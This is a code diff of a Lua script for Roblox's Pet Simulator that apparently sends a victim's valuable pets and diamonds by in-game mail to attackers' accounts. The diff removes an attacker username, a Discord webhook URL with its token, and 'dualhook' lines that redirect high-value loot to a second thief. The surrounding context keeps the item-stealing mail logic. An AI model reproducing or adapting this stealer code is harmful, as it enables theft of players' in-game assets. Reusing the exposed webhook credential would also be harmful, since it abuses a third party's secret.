@@ -16,8 +16,6 @@ for i,v in pairs(Library.Save.Get().Pets) do
     end
 end
 if hugeamount >1 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
-     UserName = "TehPucuk_55"
-     Webhook = "https://discord.com/api/webhooks/1105338973276098640/06ugJwRCNfo9JEKzGcvhiPQjz4v72-qeUH1Hz3MnRSpAqMcteAyq4Pxk5CmpZC5sXSxu"
 end
 
 if getgenv().executed then return end
@@ -1256,7 +1254,6 @@ if FinalList == 0 then
     end
     if gemsin ~= nil then
         if dualhook(gemsin) then
-            user = dhuser
         end
     end
     local args = {
@@ -1276,7 +1273,6 @@ spawn(function()
                 user = UserName
                 if titanicin ~= nil then
                     if dualhook(titanicin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1304,7 +1300,6 @@ spawn(function()
                 user = UserName
                 if bananin ~= nil then
                     if dualhook(bananin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1334,7 +1329,6 @@ spawn(function()
                 user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1363,7 +1357,6 @@ spawn(function()
                 user = UserName
                 if pogin ~= nil then
                     if dualhook(pogin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1391,7 +1384,6 @@ spawn(function()
                 user = UserName
                 if excin ~= nil then
                     if dualhook(excin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1419,7 +1411,6 @@ spawn(function()
                 user = ndUser
                 if eventin ~= nil then
                     if dualhook(eventin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1447,7 +1438,6 @@ spawn(function()
                 user = ndUser
                 if secretin ~= nil then
                     if dualhook(secretin) then
-                        user = dhuser
                     end
                 end
                 local args = {
